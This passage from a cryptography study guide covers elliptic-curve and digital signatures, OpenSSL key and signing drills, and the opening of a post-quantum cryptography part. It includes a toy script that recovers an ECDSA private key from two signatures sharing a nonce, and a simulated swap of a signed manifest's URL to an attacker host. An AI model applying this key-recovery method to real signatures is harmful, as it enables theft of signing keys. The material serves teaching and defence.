wc -c ed.pem ed.pub                       # tiny compared to RSA

echo "ship release v2.1.0" > release.txt
openssl pkeyutl -sign   -inkey ed.pem  -rawin -in release.txt -out release.sig
openssl pkeyutl -verify -pubin -inkey ed.pub -rawin -in release.txt \
        -sigfile release.sig              # -> "Signature Verified Successfully"

# tamper
echo "ship release v2.1.0 (backdoored)" > release.txt
openssl pkeyutl -verify -pubin -inkey ed.pub -rawin -in release.txt \
        -sigfile release.sig              # -> verification fails
```

```bash
# --- the k-reuse catastrophe, demonstrated ---
.venv/bin/python - <<'PY'
# Toy ECDSA over a small curve to show: reuse k -> recover the private key.
# Curve: y^2 = x^3 + 2x + 2 mod 17,  base point G=(5,1), order n=19
p, a, n = 17, 2, 19
G = (5, 1)

def inv(x, m): return pow(x, -1, m)
def add(P, Q):
    if P is None: return Q
    if Q is None: return P
    if P[0] == Q[0] and (P[1] + Q[1]) % p == 0: return None
    if P == Q:
        l = (3*P[0]*P[0] + a) * inv(2*P[1], p) % p
    else:
        l = (Q[1] - P[1]) * inv((Q[0] - P[0]) % p, p) % p
    x = (l*l - P[0] - Q[0]) % p
    return (x, (l*(P[0] - x) - P[1]) % p)
def mul(k, P):
    R = None
    while k:
        if k & 1: R = add(R, P)
        P = add(P, P); k >>= 1
    return R

priv = 7
pub  = mul(priv, G)

def sign(z, k):
    x1, _ = mul(k, G)
    r = x1 % n
    s = inv(k, n) * (z + r*priv) % n
    return r, s

k = 5                       # THE BUG: same k for both messages
z1, z2 = 3, 11              # two different message hashes
r1, s1 = sign(z1, k)
r2, s2 = sign(z2, k)
print(f"sig1 = (r={r1}, s={s1})")
print(f"sig2 = (r={r2}, s={s2})   note r1 == r2 -> k was reused")

# attacker's algebra:  k = (z1 - z2) / (s1 - s2) mod n
k_rec    = (z1 - z2) * inv((s1 - s2) % n, n) % n
priv_rec = (s1 * k_rec - z1) * inv(r1, n) % n
print(f"\nrecovered k    = {k_rec}   (real: {k})")
print(f"recovered priv = {priv_rec}   (real: {priv})")
print("PRIVATE KEY STOLEN from two signatures. This is the PS3 bug.")
PY
```

### Practice (35 min)

1. Generate an Ed25519 key, sign a file, verify it, tamper with the file, watch
   verification fail.
2. Compare sizes: Ed25519 vs RSA-2048 vs RSA-4096 public keys and signatures.
   Tabulate.
3. Run `openssl speed ecdsap256 ed25519 rsa2048` and compare sign/verify rates.
4. Run the k-reuse demo. Then, in `notes.md`, state in one sentence why Ed25519
   makes this attack structurally impossible.
5. Read the P-256 vs Curve25519 argument (further reading) and write two
   sentences on why you'd pick 25519 for a new system.

### Common confusions

- **"ECC is newer and less trusted than RSA."** ECC has been standardised since
  the mid-2000s and is now the default across TLS, SSH, and code signing. It is
  at least as trusted.
- **"ECDSA and EdDSA are the same."** Both are elliptic-curve signatures. ECDSA
  needs a random `k` per signature (footgun). EdDSA/Ed25519 is deterministic (no
  footgun).
- **"X25519 and Ed25519 are interchangeable keys."** No. X25519 is for key
  exchange (ECDH), Ed25519 for signatures. They use the same underlying curve but
  different key encodings; don't cross-use them.
- **"Smaller keys mean less security."** For ECC vs RSA, no — the maths is
  harder to attack, so less key achieves the same strength.
- **"ECC is quantum-safe."** No — Shor's algorithm breaks ECDLP too, and ECC
  keys are *smaller*, so arguably fall first. (Part 6.)

### Check yourself

1. What RSA key size does a 256-bit elliptic-curve key match?
2. What's the hard problem underneath ECC?
3. What is the deadly footgun in ECDSA, and name a real incident it caused.
4. How does Ed25519 avoid that footgun?
5. Which primitive for key exchange, which for signatures, in the Curve25519
   family?
6. Is ECC post-quantum secure?

### Further reading

- **Site:** `safecurves.cr.yp.to` — Bernstein & Lange's criteria for safe curves,
  and how each named curve scores. Opinionated, influential.
- **Article:** "A (Relatively Easy To Understand) Primer on Elliptic Curve
  Cryptography" (Cloudflare blog) — the best gentle introduction.
- **RFC 8032** — EdDSA / Ed25519. Includes test vectors.
- **Talk:** "Elliptic Curve Cryptography for Beginners" — many good conference
  versions exist; look for one with the geometric point-addition animation.
- **Post-mortem:** fail0verflow's Chaos Communication Congress talk on the PS3
  ECDSA break (2010).

---

## Chapter 21 — Digital signatures

### In one sentence

A digital signature uses a private key to produce a tag that anyone with the
matching public key can verify, proving the message is unchanged and came from
the key's owner — and, unlike a MAC, proving it to *third parties*.

### The problem

HMAC (Chapter 11) proves integrity and authenticity, but **both parties share the
key**, so Bob can't prove to a judge that Alice — not Bob himself — produced a
given tag. And HMAC needs a pre-shared secret, which brings back key distribution.

Signatures fix both:

```
   HMAC                              SIGNATURE
   ----                              ---------
   shared secret key                 private key signs / public key verifies
   either party can produce a tag    only the private-key holder can sign
   verifier could have forged it     verifier demonstrably could NOT have
   -> no non-repudiation             -> NON-REPUDIATION
   needs key pre-shared              public key can be published freely
```

**Non-repudiation** — the signer cannot credibly deny signing — is the property
that makes signatures the basis of code signing, certificates, contracts,
blockchains, and software updates.

### How it actually works

You never sign the raw message (it's too big, and raw sign operations have
structure). You sign its **hash**:

```
   SIGNING                                VERIFYING
   -------                                ---------
   1. h = SHA-256(message)                1. h  = SHA-256(received message)
   2. sig = Sign(private_key, h)          2. h' = Verify(public_key, sig)
   3. send (message, sig)                 3. accept iff h == h'
```

Consequences of the "sign the hash" design:

```
   - A broken hash breaks the signature scheme. SHA-1 collisions (Ch 9) meant
     an attacker could get a benign document signed and swap in a malicious
     one with the same hash. This is why CAs abandoned SHA-1.
   - The signature size depends only on the algorithm, not the message.
     A 10 GB file and a 10-byte file get the same 64-byte Ed25519 signature.
```

### The algorithms

| Scheme | Key type | Sig size (approx) | Notes |
|---|---|---|---|
| **Ed25519** | Curve25519 | 64 bytes | **First choice.** Deterministic, fast, misuse-resistant |
| **ECDSA P-256** | NIST P-256 | ~64-72 bytes (DER) | Ubiquitous in TLS; needs safe `k` (RFC 6979) |
| **RSA-PSS** | RSA-2048+ | 256+ bytes | Modern RSA signatures; use over PKCS#1 v1.5 |
| **RSA PKCS#1 v1.5** | RSA-2048+ | 256+ bytes | Legacy but everywhere (JWT `RS256`); acceptable |
| **Ed448** | Curve448 | 114 bytes | Higher security margin, rarer |
| SLH-DSA / ML-DSA | post-quantum | 7 KB - 50 KB | Part 6 |

### What a signature does and does NOT prove

```
   PROVES:
     [x] the message wasn't altered after signing
     [x] whoever signed held the private key
     [x] (to a third party) that the key-holder signed -- non-repudiation

   DOES NOT PROVE:
     [ ] WHO the key-holder is         -> needs a certificate / web of trust
     [ ] WHEN it was signed            -> needs a trusted timestamp
     [ ] that the signer MEANT it / read it   ("what you see is what you sign")
     [ ] that the key isn't stolen or the signer isn't coerced
     [ ] freshness -- an old validly-signed message can be REPLAYED unless
         the signed content includes a nonce/timestamp
```

The gap between "valid signature" and "trustworthy message" is filled by **PKI**
(Part 7) for identity, and by protocol design (nonces, timestamps, expiry) for
freshness.

### Where you'll use signatures

```
   TLS certificates        CA signs "this public key belongs to example.com"
   TLS handshake           server signs the ephemeral ECDHE params (authenticity)
   Code signing            Apple/Microsoft/distro signs binaries and packages
   Software updates        the update file is signed; the updater verifies
                             before installing (TUF, Sigstore)
   JWT (RS256/ES256/EdDSA) the token issuer signs the claims
   Git                     signed commits and tags (git commit -S)
   SSH                     server host key signs to prove identity; user key
                             signs to authenticate (Part 8)
   Blockchains             every transaction is a signature
   Secure boot             each stage verifies the next stage's signature
```

### Worked example (run it)

```bash
cd ~/sec-lab/scratch

# --- Ed25519 end to end ---
openssl genpkey -algorithm ed25519 -out signer.pem
openssl pkey -in signer.pem -pubout -out signer.pub

cat > update.json <<'EOF'
{"version":"4.2.0","url":"https://cdn.example.com/app-4.2.0.tar.gz",
 "sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
EOF

# sign
openssl pkeyutl -sign -inkey signer.pem -rawin -in update.json -out update.sig

# verify (this is what the updater does before trusting the manifest)
openssl pkeyutl -verify -pubin -inkey signer.pub -rawin -in update.json \
        -sigfile update.sig

# attacker swaps the download URL
sed -i.bak 's#cdn.example.com#evil.example#' update.json
openssl pkeyutl -verify -pubin -inkey signer.pub -rawin -in update.json \
        -sigfile update.sig            # FAILS -- the manifest is rejected
```

```bash
# --- MAC vs signature: the non-repudiation difference ---
.venv/bin/python - <<'PY'
import hmac, hashlib
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

msg = b"Alice agrees to pay Bob 500."

# HMAC: Bob ALSO has the key, so Bob could have made this himself.
k = b"shared-key"
tag = hmac.new(k, msg, hashlib.sha256).hexdigest()
print("HMAC tag:", tag[:32], "...")
print("  -> a judge can't tell if Alice or Bob produced it. No non-repudiation.")

# Signature: only Alice has the private key.
alice = Ed25519PrivateKey.generate()
sig = alice.sign(msg)
alice.public_key().verify(sig, msg)      # raises if invalid
print("\nEd25519 signature verified against Alice's PUBLIC key.")
print("  -> only Alice's private key could produce it. Non-repudiation.")
PY
```

```bash
# --- signed Git commits ---
# git config --global user.signingkey <key>
# git config --global commit.gpgsign true      # or gpg.format ssh + user.signingkey
git init -q demo && cd demo
git config gpg.format ssh
git config user.signingkey "$PWD/../signer.pub"
git config gpg.ssh.allowedSignersFile /dev/null
echo hi > f && git add f
git -c commit.gpgsign=true commit -q -S -m "signed commit" 2>&1 | head -2 || true
git log --show-signature -1 2>&1 | head -8
cd ..
```

### Practice (35 min)

1. Sign a release manifest with Ed25519; verify it; tamper with one byte of the
   manifest; confirm verification fails.
2. Sign the same manifest with RSA-PSS and with ECDSA P-256. Compare signature
   sizes and `openssl speed` sign/verify rates across all three.
3. Run the MAC-vs-signature script. Write, in `notes.md`, a two-sentence
   explanation of non-repudiation you could give a non-engineer.
4. Set up SSH-based signed Git commits (`gpg.format ssh`). Make a signed commit.
   Break the signature by amending the message with `--no-gpg-sign` and see
   `git log --show-signature` flag it.
5. Explain why "valid signature" does not mean "safe to run this binary". List
   three things still required.

### Common confusions

- **"A signature encrypts the message."** No. The message travels in the clear;
  the signature only proves integrity + origin. Combine with encryption if you
  need secrecy.
- **"Verifying a signature means I can trust the content."** It means the content
  wasn't altered since signing by *that key*. Whether to trust *that key* is PKI's
  job.
- **"Sign then encrypt" vs "encrypt then sign".** Both have pitfalls (identity
  stripping, surreptitious forwarding). Prefer a construction that binds identity
  into the signed/encrypted data, or use a vetted protocol.
- **"Old signatures stay valid forever, so replays are fine."** A validly-signed
  message can be replayed. Put a timestamp/nonce/expiry *inside* the signed data.
- **"RSA signing = RSA decryption."** Structurally similar, but different padding
  (PSS vs OAEP) and you must never share a key between the two roles.

### Check yourself

1. What does a signature give you that an HMAC does not?
2. Why do you sign the hash of a message rather than the message itself?
3. What does a broken hash function do to a signature scheme? Give the real
   example.
4. List three things a valid signature does *not* prove.
5. How do you stop a validly-signed message from being replayed?

### Further reading

- **Book:** *Serious Cryptography* (2nd ed.), Chapter 10 (Digital Signatures).
- **Project:** Sigstore (`sigstore.dev`) — modern, keyless software signing with
  transparency logs. Read the "how it works" page.
- **Spec:** The Update Framework (TUF), `theupdateframework.io` — how to design a
  software-update system that survives key compromise.
- **Article:** "How (not) to sign a JSON object" (Latacora) — canonicalisation
  pitfalls in signing structured data.
- **Video:** Computerphile, "Digital Signatures".

---

## Chapter 22 — Hands-on: keys, signatures, and key exchange with OpenSSL

### Why this chapter exists

Parts 7 and 8 (TLS, SSH) assume you can fluently generate keys, inspect them,
sign, verify, and derive shared secrets. This is the drill. Do it end to end
once and the rest of the guide gets easier.

### The one setup step: get real OpenSSL

```bash
openssl version
# LibreSSL x.x.x   -> you are on macOS's build; several commands below WILL FAIL
# OpenSSL 3.x.x    -> you're good

# macOS fix:
brew install openssl@3
echo 'export PATH="'"$(brew --prefix openssl@3)"'/bin:$PATH"' >> ~/.zshrc
exec zsh
openssl version        # should now say OpenSSL 3.x
```

Everything below is written for **OpenSSL 3.x**.

### 1. Generate every key type

```bash
mkdir -p ~/sec-lab/keys && cd ~/sec-lab/keys

# RSA 2048 and 4096
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out rsa2048.pem
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out rsa4096.pem

# EC: NIST P-256 and P-384
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out ec256.pem
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-384 -out ec384.pem

# Modern: Ed25519 (signatures) and X25519 (key exchange)
openssl genpkey -algorithm ed25519 -out ed25519.pem
openssl genpkey -algorithm x25519  -out x25519.pem

# Derive every public key
for k in rsa2048 rsa4096 ec256 ec384 ed25519 x25519; do
  openssl pkey -in $k.pem -pubout -out $k.pub
done

ls -l *.pem *.pub        # note how much smaller the EC/25519 files are
```

### 2. Inspect keys

```bash
# human-readable dump
openssl pkey -in rsa2048.pem -text -noout | head -25
openssl pkey -in ec256.pem   -text -noout
openssl pkey -in ed25519.pem -text -noout

# just the key type and size
openssl pkey -in rsa4096.pem -noout -text | grep -i 'private-key'

# public key only
openssl pkey -in ec256.pem -pubout -text -noout

# convert PEM <-> DER
openssl pkey -in ec256.pem -outform DER -out ec256.der
openssl pkey -in ec256.der -inform DER -text -noout | head -3

# encrypt a private key at rest (you'll be prompted for a passphrase)
openssl pkey -in rsa2048.pem -aes-256-cbc -out rsa2048.enc.pem
```

### 3. Sign and verify

```bash
cd ~/sec-lab/keys
echo "release 5.0.0 build a1b2c3" > artifact.txt

# RSA-PSS
openssl dgst -sha256 -sign rsa2048.pem -sigopt rsa_padding_mode:pss \
        -out artifact.rsa.sig artifact.txt
openssl dgst -sha256 -verify rsa2048.pub -sigopt rsa_padding_mode:pss \
        -signature artifact.rsa.sig artifact.txt

# ECDSA P-256
openssl dgst -sha256 -sign ec256.pem -out artifact.ec.sig artifact.txt
openssl dgst -sha256 -verify ec256.pub -signature artifact.ec.sig artifact.txt

# Ed25519 (no -dgst; sign the raw message)
openssl pkeyutl -sign -inkey ed25519.pem -rawin -in artifact.txt \
        -out artifact.ed.sig
openssl pkeyutl -verify -pubin -inkey ed25519.pub -rawin -in artifact.txt \
        -sigfile artifact.ed.sig

# prove tampering is caught
echo "release 5.0.0 build DEADBEEF" > artifact.txt
openssl pkeyutl -verify -pubin -inkey ed25519.pub -rawin -in artifact.txt \
        -sigfile artifact.ed.sig      # fails
```

### 4. Key exchange (ECDH / X25519)

```bash
cd ~/sec-lab/keys

# Two parties each generate an X25519 keypair
openssl genpkey -algorithm x25519 -out alice.pem
openssl genpkey -algorithm x25519 -out bob.pem
openssl pkey -in alice.pem -pubout -out alice.pub
openssl pkey -in bob.pem   -pubout -out bob.pub

# Each derives the shared secret from their private key + the other's public key
openssl pkeyutl -derive -inkey alice.pem -peerkey bob.pub -out s_alice.bin
openssl pkeyutl -derive -inkey bob.pem   -peerkey alice.pub -out s_bob.bin

xxd s_alice.bin
xxd s_bob.bin
cmp s_alice.bin s_bob.bin && echo "SHARED SECRETS MATCH"

# Turn the raw secret into an actual AES key with a KDF (don't use it directly)
openssl kdf -keylen 32 -kdfopt digest:SHA256 \
  -kdfopt key:$(xxd -p -c256 s_alice.bin) \
  -kdfopt info:$(echo -n 'secureshop session key' | xxd -p) HKDF
```

### 5. Benchmark everything

```bash
openssl speed -seconds 2 rsa2048 rsa4096 ecdsap256 ed25519 2>/dev/null | tail -12
openssl speed -seconds 2 ecdhx25519 ecdhp256 2>/dev/null | tail -6
```

Read the table. Internalise these rough facts:

```
   * RSA signing is SLOW; RSA verifying is fast (asymmetric cost -- shapes
     protocols: you verify certs often, CAs sign rarely).
   * ECDSA / Ed25519 sign and verify are both fast and roughly balanced.
   * Ed25519 is typically the fastest signer.
   * X25519 key exchange is very cheap -- which is why every TLS 1.3
     connection can afford a fresh one (forward secrecy is basically free).
```

### Practice / mini-project (60 min) — "signed release" tool

Build a tiny end-to-end release-signing workflow. This is a real pattern you'll
reimplement in production.

```
   Requirements:
   1. `keygen`  -> produces an Ed25519 signing keypair; stores the private key
                   encrypted with a passphrase.
   2. `sign <dir>` -> hashes every file in <dir> (SHA-256), writes a MANIFEST
                      file listing path + hash, then signs the MANIFEST.
   3. `verify <dir>` -> checks the MANIFEST signature against the public key,
                        then re-hashes every file and confirms it matches.
                        Any mismatch, missing file, or extra file = FAIL.

   Test it:
   - Happy path verifies.
   - Change one byte in one file -> verify fails, naming the file.
   - Add a file not in the manifest -> verify fails.
   - Corrupt the signature -> verify fails before hashing anything.
   - Sign with key A, verify with key B -> fails.
```

You may write it in bash (`openssl`, `sha256sum`) or Python (`cryptography`).
Keep it under ~80 lines. Save it as `~/sec-lab/tools/release-sign`. Part 12
extends this idea into SecureShop's deployment pipeline.

### Common confusions

- **"`openssl rsa` / `openssl ec` / `openssl dsa`."** These are the *legacy*
  per-algorithm commands. In OpenSSL 3.x, `openssl genpkey` and `openssl pkey`
  handle every type uniformly. Learn those.
- **"Ed25519 with `-sha256`."** Ed25519 hashes internally. Use `pkeyutl -rawin`,
  not `dgst`.
- **"The X25519 shared secret is my session key."** Run it through HKDF first.
- **"`openssl pkeyutl -derive` on macOS."** LibreSSL lacks X25519. Get OpenSSL
  3.x.

### Check yourself

1. Which single `openssl` subcommand generates an RSA, EC, or Ed25519 private
   key in 3.x?
2. Why does Ed25519 signing not use `openssl dgst`?
3. After `openssl pkeyutl -derive`, what must you do before using the output as a
   key?
4. From the `openssl speed` numbers: is RSA signing or verifying the slow
   direction, and how does that shape TLS?

### Further reading

- **Book (free):** *OpenSSL Cookbook* — Ivan Ristić. Chapters on key and CSR
  management are the reference for Parts 7–8.
- **Cheat sheet:** the "OpenSSL Essentials" post on the DigitalOcean community
  site — practical and correct.
- **Man pages:** `openssl-genpkey(1)`, `openssl-pkey(1)`, `openssl-pkeyutl(1)`,
  `openssl-dgst(1)`, `openssl-speed(1)`.
- **Appendix B** of this guide — the OpenSSL cookbook tuned to everything here.

---

### End of Part 5 — Milestone check

- [ ] I can explain the key-distribution problem and how public keys solve it
- [ ] I know which key encrypts-to-someone and which key signs
- [ ] **I have done a toy Diffie-Hellman by hand and seen both sides agree**
- [ ] I can explain forward secrecy and why TLS 1.3 mandates ECDHE
- [ ] I did toy RSA by hand: computed d, encrypted, decrypted, signed, verified
- [ ] I can state why textbook RSA is broken and what OAEP/PSS add
- [ ] I know why a 256-bit ECC key equals a 3072-bit RSA key
- [ ] **I have seen a private key recovered from two ECDSA signatures with a
      reused k**
- [ ] I can explain non-repudiation and when to use a signature over an HMAC
- [ ] **I have generated every key type, signed, verified, and derived an ECDH
      shared secret with OpenSSL**
- [ ] I built the signed-release tool

---

# Part 6 — Post-quantum cryptography

Everything in Part 5 — RSA, Diffie–Hellman, elliptic curves — rests on two hard
problems: factoring, and discrete logarithms. A large enough quantum computer
solves **both** efficiently. This Part is about what replaces them, and what to
do *now* even though that computer doesn't exist yet.

## Chapter 23 — Why quantum computers break today's public-key crypto

### In one sentence

A sufficiently large quantum computer running **Shor's algorithm** factors
integers and computes discrete logarithms in feasible time, which breaks RSA,
Diffie–Hellman, and elliptic-curve cryptography completely — while symmetric
crypto and hashes are only mildly affected.

### What a quantum computer actually is (enough to reason about it)

```
   Classical bit:  0 or 1.
   Qubit:          a superposition -- amplitudes for BOTH 0 and 1 at once.

   n qubits represent 2^n amplitudes simultaneously. A quantum algorithm
   manipulates all of them in parallel, then uses INTERFERENCE to make the
   wrong answers cancel out and the right answer stand out when measured.

   This is NOT "tries every answer at once and picks one". Measurement
   collapses to a single value. The art is arranging the interference so
   that value is the one you want, with high probability.
```

It is **not** a faster classical computer. It's fast at a narrow set of problems
with the right structure — and factoring and discrete-log have exactly that
structure (periodicity).

### Shor's algorithm — the crypto-breaker

Peter Shor showed in 1994 that a quantum computer can find the **period** of a
function exponentially faster than any known classical method. Factoring and
discrete-log both reduce to period-finding.

```
   PROBLEM                    CLASSICAL BEST           QUANTUM (Shor)
   -------                    --------------           --------------
   Factor a 2048-bit RSA      ~ 10^20 years            hours to days*
     modulus                   (sub-exponential)        (polynomial)
   Discrete log (DH)          same ballpark            same -- broken
   Elliptic-curve discrete    ~ 2^128 operations       broken; needs FEWER
     log (ECC)                                          qubits than RSA

   * on a cryptographically-relevant quantum computer (CRQC) that does
     not yet exist publicly. Recent resource estimates: under ~1 million
     noisy qubits for RSA-2048. Today's largest devices: ~1000-1500 qubits,
     far too noisy. The gap is large -- but engineering, not physics.
```

**The consequence is total, not partial.** A bigger RSA key doesn't help — Shor
scales polynomially. RSA-4096 buys you almost nothing over RSA-2048 against a
quantum attacker. ECC is *worse off* per bit: P-256 needs fewer logical qubits to
break than RSA-2048.

### Grover's algorithm — the mild one

Grover's algorithm searches an unstructured space of size `N` in about `sqrt(N)`
steps. Applied to symmetric crypto and hashes:

```
   AES-128:  2^128 brute force  ->  ~2^64 quantum   -- UNCOMFORTABLE
   AES-256:  2^256 brute force  ->  ~2^128 quantum  -- STILL FINE

   SHA-256 preimage: 2^256      ->  ~2^128 quantum  -- STILL FINE
   SHA-256 collision: 2^128     ->  ~2^85 quantum   -- fine (and Grover
                                    barely helps collisions in practice)
```

**The fix is trivial: double the key size.** Use AES-256, SHA-384/SHA-512.
That's the entire post-quantum story for symmetric crypto — which is why this
guide told you to pick AES-256 back in Chapter 13.

```
   +------------------------------------------------------------------+
   |  QUANTUM IMPACT SUMMARY                                           |
   |                                                                  |
   |  Public-key (RSA, DH, ECDH, ECDSA, EdDSA)  ->  BROKEN. Replace.   |
   |  Symmetric (AES)                           ->  use 256-bit. Done. |
   |  Hashes (SHA-2, SHA-3)                     ->  use >= 384-bit     |
   |                                                output. Done.      |
   +------------------------------------------------------------------+
```

### "Harvest now, decrypt later" — why this is urgent today

You might think: "no quantum computer exists, so I have years." For
**confidentiality**, that reasoning is wrong.

```
   1. TODAY:  an adversary records your encrypted traffic (or steals
              encrypted backups) and stores it. Cheap. Nation-states are
              widely assumed to be doing this at scale already.

   2. LATER:  a CRQC arrives (estimates cluster around the 2030s).

   3. THEN:   they run Shor on the recorded key exchanges, recover the
              session keys, and decrypt everything from step 1
              retroactively.
```

This is **HNDL** (harvest now, decrypt later), also called *store-now-decrypt-
later*. The question that matters:

> **Does any data you send today still need to be secret in 2035?**

Health records, state secrets, source code, legal documents, long-lived
credentials, biometric templates — yes. For those, the migration deadline is
**now**, not "when quantum computers arrive".

For **signatures** and **authentication**, HNDL doesn't apply the same way — a
signature forged in 2035 can't retroactively authenticate a 2026 TLS handshake.
So signature migration is important but less time-critical than key exchange.

### The official timelines

| Body | Guidance (as of early 2026) |
|---|---|
| **NIST** (IR 8547, draft) | Deprecate RSA/ECDH/ECDSA at 112–128-bit levels by **2030**; disallow after **2035** |
| **NSA CNSA 2.0** | National-security systems: PQC-only for software/firmware signing now; general use through **2033** |
| **UK NCSC** | Migrate high-value/long-life systems by **2028**; bulk by **2031**; complete by **2035** |
| **Germany BSI, France ANSSI** | Recommend **hybrid** (classical + PQC) immediately for anything long-lived |

### Practice (20 min) — no code, just reasoning

1. List every system you work on that transmits or stores data. For each, answer:
   *if this were decrypted in 2035, would that matter?* Mark each
   HNDL-sensitive / not.
2. For one HNDL-sensitive system, find out what key exchange its TLS uses today
   (`openssl s_client -connect host:443` and look at the "Server Temp Key" line,
   or use `testssl.sh`). Is it `X25519` / `P-256` (classical, vulnerable) or
   `X25519MLKEM768` (hybrid, protected)?
3. Write a one-paragraph "crypto inventory" note for that system: what
   algorithms, what key sizes, where the keys live, who could swap them. You'll
   need exactly this document when migration lands.

### Common confusions

- **"Quantum computers try all keys in parallel."** No. Superposition isn't
  parallel search; measurement returns one value. Shor works because factoring
  has *periodic structure* Grover-style search doesn't exploit.
- **"Bigger RSA keys will hold quantum off."** No. Shor is polynomial. RSA-16384
  falls about as easily as RSA-2048 to a CRQC (just slower by a small factor).
- **"AES is broken by quantum too."** Only halved. AES-256 → 128-bit effective,
  still infeasible. Symmetric crypto is basically fine.
- **"No CRQC exists, so there's nothing to do."** HNDL means confidentiality
  migration is urgent *now* for long-lived secrets.
- **"Quantum will also break my password hashes / HMAC."** Grover halves the
  brute-force exponent; Argon2id with good parameters and HMAC-SHA-256 remain
  fine.

### Check yourself

1. Which algorithm breaks RSA and ECC, and what does it scale like?
2. Why doesn't increasing your RSA key size help against a quantum attacker?
3. What does Grover's algorithm do to AES-256, and is that a problem?
4. Explain "harvest now, decrypt later" and why it makes migration urgent today.
5. Is signature migration or key-exchange migration more time-critical? Why?

*(Answers: Appendix F.)*

### Further reading

- **Report:** NIST IR 8547, "Transition to Post-Quantum Cryptography Standards"
  (draft). The authoritative timeline.
- **Paper:** "How to factor 2048 bit RSA integers in 8 hours using 20 million
  noisy qubits" — Gidney & Ekerå, 2019 (and Gidney's 2025 update reducing the
  estimate). Resource estimates, made concrete.
- **Video:** "Shor's Algorithm Explained" — minutephysics, and the longer
  PBS Space Time version.
- **Site:** `pqc.info` and the Cloudflare "post-quantum" blog series — readable,
  current, deployment-focused.
- **Book:** *Serious Cryptography* (2nd ed.), Chapter 14 (Quantum and
  Post-Quantum).

---

## Chapter 24 — The post-quantum algorithms

### In one sentence

NIST has standardised a small set of quantum-resistant algorithms built on
different hard problems — mainly **structured lattices** for the everyday ones,
plus **hash-based** and **code-based** alternatives as hedges.

### The NIST standards (finalised August 2024)

| Standard | Name | Was called | Type | Replaces |
|---|---|---|---|---|
| **FIPS 203** | **ML-KEM** | CRYSTALS-Kyber | Key encapsulation (KEM) | ECDH / RSA key transport |
| **FIPS 204** | **ML-DSA** | CRYSTALS-Dilithium | Signature | ECDSA / RSA / EdDSA |
| **FIPS 205** | **SLH-DSA** | SPHINCS+ | Signature (hash-based) | signatures where you distrust lattices |
| **FIPS 206** (draft) | **FN-DSA** | Falcon | Signature (lattice, compact) | ECDSA where signature size matters |

Plus, selected in 2025 as a **backup KEM** on different maths:

| | **HQC** | Code-based (error-correcting codes) | ML-KEM backup — standard drafting now |

"ML" = *Module-Lattice*. "SLH" = *StateLess Hash-based*. "FN" = *Fast Fourier
over NTRU lattices*.

### The core idea: lattice problems

Most of the new standards rest on the difficulty of problems in **lattices** — a
regular grid of points in high-dimensional space.

```
   Given a lattice (defined by some basis vectors) and a point that is
   NEAR a lattice point but not exactly on one:

     * SHORTEST VECTOR PROBLEM (SVP): find the shortest non-zero lattice vector
     * CLOSEST VECTOR PROBLEM (CVP): find the lattice point nearest the target
     * LEARNING WITH ERRORS (LWE):   solve linear equations that have small
                                     random "errors" added -- recovering the
                                     secret is as hard as lattice problems

   In 2 or 3 dimensions this is easy to eyeball. In 500+ dimensions with a
   "bad" basis, the best known algorithms -- classical OR quantum -- take
   exponential time. Crucially, Shor's period-finding does NOT apply.
```

ML-KEM and ML-DSA use a structured variant (Module-LWE) for efficiency. The
structure is a mild theoretical risk (maybe it enables an attack nobody's found
yet) — which is exactly why NIST also standardised hash-based SLH-DSA and
selected code-based HQC. **Different maths, so a break in one doesn't break the
others.**

### ML-KEM (FIPS 203) — the key-exchange replacement

A **KEM** works slightly differently from Diffie–Hellman:

```
   DIFFIE-HELLMAN                    KEM (Key Encapsulation Mechanism)
   -------------                     --------------------------------
   both send a public value,        recipient publishes a public key.
   both derive the same secret      sender ENCAPSULATES: generates a random
                                    shared secret + a ciphertext that only
                                    the recipient's private key can open.
                                    Sender: (shared_secret, ciphertext)
                                    Recipient: decapsulate(ciphertext, sk)
                                               -> same shared_secret
```

**Parameter sets** (pick by security category; **768 is the recommended
default**):

| Set | NIST level | Public key | Ciphertext | Shared secret | Rough classical equiv |
|---|---|---|---|---|---|
| ML-KEM-512 | 1 | 800 B | 768 B | 32 B | AES-128 |
| **ML-KEM-768** | **3** | **1184 B** | **1088 B** | **32 B** | **AES-192** |
| ML-KEM-1024 | 5 | 1568 B | 1568 B | 32 B | AES-256 |

Compare: an X25519 public key is **32 bytes**. ML-KEM-768's is **1184** — ~37x
larger. That size growth, multiplied across every TLS handshake on earth, is the
main cost of the transition. Still small in absolute terms, and speed is
competitive with (often faster than) X25519.

### ML-DSA (FIPS 204) — the default signature replacement

| Set | NIST level | Public key | Signature | Notes |
|---|---|---|---|---|
| ML-DSA-44 | 2 | 1312 B | 2420 B | |
| **ML-DSA-65** | **3** | **1952 B** | **3309 B** | **recommended default** |
| ML-DSA-87 | 5 | 2592 B | 4627 B | CNSA 2.0 mandates this level |

Compare: Ed25519 is a 32-byte key and 64-byte signature. ML-DSA-65 is ~60x and
~50x bigger. For a TLS certificate chain (leaf + intermediate, each with a key
and a signature), that's several extra kilobytes per handshake — enough to matter
for QUIC's first flight and for constrained IoT.

### SLH-DSA (FIPS 205) — the conservative signature

Built **only from hash functions** (Chapter 8–9). If SHA-2/SHA-3 are secure,
SLH-DSA is secure — no lattice assumptions at all. The price:

```
   + Rock-solid security foundation (just needs a good hash)
   + Tiny public keys (32-64 bytes)
   + Stateless (unlike older hash-based schemes XMSS/LMS, which are
     catastrophic if you reuse state)
   - HUGE signatures: 7,856 bytes ("s" small variants) up to ~49,000 bytes
   - SLOW signing: milliseconds to tens of ms (100-1000x slower than ML-DSA)

   Use it for: firmware/boot signing, CA root signatures, code signing --
   things signed rarely, verified occasionally, and needing to stay valid
   for decades. NOT for per-connection TLS handshake signatures.
```

Naming: `SLH-DSA-SHA2-128s` = SHA-2, 128-bit security, **s**mall-signature
(slow) variant; `...128f` = **f**ast-signing (bigger signature) variant.

### FN-DSA / Falcon (FIPS 206, draft) — compact lattice signatures

Much smaller than ML-DSA (≈ 666-byte signature, 897-byte key at level 1), which
is attractive for bandwidth-constrained protocols. **But** signing needs careful
floating-point / Gaussian-sampling code that is very hard to make constant-time —
a side-channel minefield. Still in draft. Wait for the standard and vetted
implementations unless you have a specific, reviewed need.

### HQC — the code-based backup KEM

Selected March 2025 as a second KEM standard, on **error-correcting-code** maths
